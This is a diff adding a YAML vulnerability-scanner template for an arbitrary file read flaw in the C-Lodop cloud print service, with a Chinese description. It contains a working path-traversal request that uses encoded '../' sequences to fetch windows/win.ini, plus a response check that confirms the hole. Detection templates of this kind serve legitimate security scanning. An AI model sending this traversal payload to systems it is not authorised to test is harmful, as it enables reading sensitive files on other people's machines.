@@ -1,0 +1,18 @@
+id: c-lodop-read-file
+
+info:
+  name: C-Lodop 云打印机系统平台任意文件读取漏洞
+  author: hansi
+  severity: high
+  verified: true
+  description: |
+     C-Lodop打印服务系统是一款云打印软件。 C-Lodop打印服务系统存在任意文件读取漏洞，攻击者可利用漏洞获取敏感信息。
+     title="Welcome to C-Lodop"
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini
+    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+expression: r0()
